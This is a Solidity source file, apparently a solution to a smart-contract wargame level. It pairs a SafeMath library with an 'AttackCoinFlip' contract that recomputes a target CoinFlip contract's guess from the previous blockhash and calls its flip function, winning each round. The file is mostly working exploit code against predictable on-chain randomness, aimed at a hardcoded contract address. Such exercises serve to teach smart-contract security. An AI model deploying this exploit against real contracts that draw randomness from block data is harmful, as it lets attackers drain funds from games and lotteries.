// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface CoinFlipInteface {
    function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
  address public owner;
    CoinFlipInteface coinflip;
    uint256 public consecutiveWins;
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
      owner = msg.sender;
        address _coinFlipAddress = 0x961A00a3A8aa3F50434295EE69C736bA71237bDC;
        coinflip = CoinFlipInteface(_coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
        bool side = coinFlip == 1 ? true : false;
        bool r = coinflip.flip(side);
        consecutiveWins++;
        // console.log("consecutiveWins: %s", consecutiveWins);
    }

    function destroy() public {
      require(msg.sender == owner);
      selfdestruct(msg.sender);
    }
}